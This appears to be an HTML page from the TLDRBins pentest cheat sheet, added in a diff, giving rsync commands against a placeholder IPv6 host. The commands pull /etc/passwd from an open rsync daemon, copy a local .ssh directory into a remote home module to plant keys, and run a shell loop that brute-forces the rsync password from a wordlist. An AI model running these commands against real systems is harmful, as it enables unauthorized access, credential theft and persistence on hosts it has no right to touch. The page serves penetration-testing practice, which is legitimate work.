@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<title>rsync | TLDRBins</title>
+<meta name="robots" content='noindex, nofollow'>
+<meta name="description" content="">
+<meta name="generator" content="hugo-index">
+<link crossorigin="anonymous" href="https://tldrbins.github.io/assets/stylesheet.css" rel="preload stylesheet" as="style">
+<script crossorigin="anonymous" src="https://tldrbins.github.io/assets/quicklink.js" rel="preload" as="script"></script>
+<script>
+    window.addEventListener('load', () => {
+        quicklink.listen();
+    });
+</script>
+
+  </head>
+  <body><header>
+  <h1>
+    <a href="https://tldrbins.github.io/">
+      <img src="https://tldrbins.github.io/index.png" alt="TLDRBins">
+      <span>TLDRBins</span>
+    </a>
+    <span class="hl">/</span>
+    <a href="https://tldrbins.github.io/rsync/">
+      <span>rsync</span>
+    </a>
+  </h1>
+  <p class="desc"></p>
+</header>
+<div class="main">
+
+<ul class="tagsList single">
+  
+  <li><a href="https://tldrbins.github.io/@rsync/">Rsync</a></li>
+  
+</ul>
+
+<div class="content"><hr>
+<h3 id="basic-commands">Basic Commands</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># List directory (&#39;/&#39;) with ipv6</span>
+</span></span><span class="line"><span class="cl">rsync --list-only -a rsync://<span class="o">[</span>dead:beef::1234:5678:90ab:cdef<span class="o">]</span>:8730/
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># List a file with ipv6</span>
+</span></span><span class="line"><span class="cl">rsync --list-only -a rsync://<span class="o">[</span>dead:beef::1234:5678:90ab:cdef<span class="o">]</span>:8730/etc/passwd
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># List files (wildcard) with ipv6</span>
+</span></span><span class="line"><span class="cl">rsync --list-only -a rsync://<span class="o">[</span>dead:beef::1234:5678:90ab:cdef<span class="o">]</span>:8730/etc/rsync*
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Get a file with ipv6</span>
+</span></span><span class="line"><span class="cl">rsync -a rsync://<span class="o">[</span>dead:beef::1234:5678:90ab:cdef<span class="o">]</span>:8730/etc/passwd .
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Get files (wildcard) with ipv6</span>
+</span></span><span class="line"><span class="cl">rsync -a rsync://<span class="o">[</span>dead:beef::1234:5678:90ab:cdef<span class="o">]</span>:8730/etc/rsync* .
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Copy files recusively to remote (With Creds)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">RSYNC_PASSWORD</span><span class="o">=</span>password<span class="p">;</span> rsync -aR .ssh/ rsync://user@<span class="o">[</span>dead:beef::1234:5678:90ab:cdef<span class="o">]</span>:8730/home_user/
+</span></span></code></pre></div><h3 id="bruteforce-rsync-password">Bruteforce rsync password</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Check user from /etc/passwd, module from /etc/rsyncrsyncd.conf (e.g. user user and module home_user)</span>
+</span></span><span class="line"><span class="cl">cat passwords.txt <span class="p">|</span> <span class="k">while</span> <span class="nb">read</span> password<span class="p">;</span> <span class="k">do</span> <span class="nb">export</span> <span class="nv">RSYNC_PASSWORD</span><span class="o">=</span><span class="si">${</span><span class="nv">password</span><span class="si">}</span><span class="p">;</span> rsync --list-only rsync://user@<span class="o">[</span>dead:beef::1234:5678:90ab:cdef<span class="o">]</span>:8730/home_user 2&gt;<span class="p">&amp;</span><span class="m">1</span> <span class="p">|</span> grep -q <span class="s2">&#34;auth failed on module home_user&#34;</span> <span class="o">||</span> <span class="o">{</span> <span class="nb">echo</span> <span class="s2">&#34;[+] Found: </span><span class="si">${</span><span class="nv">RSYNC_PASSWORD</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">;</span> break<span class="p">;</span> <span class="o">}</span> <span class="k">done</span>
+</span></span></code></pre></div><br></div></div>
+    
+    <script src="/js/utils.js"></script>
+    <footer>
+    <hr>
+    <div class="footer-text">
+        <div>© 2024 TLDRBins</div>
+        <div>Powered by <a href="https://gohugo.io/">Hugo</a> & <a
+                href="https://github.com/adityatelange/hugo-index/">Index</a></div>
+    </div>
+</footer>
+</body>
+</html>
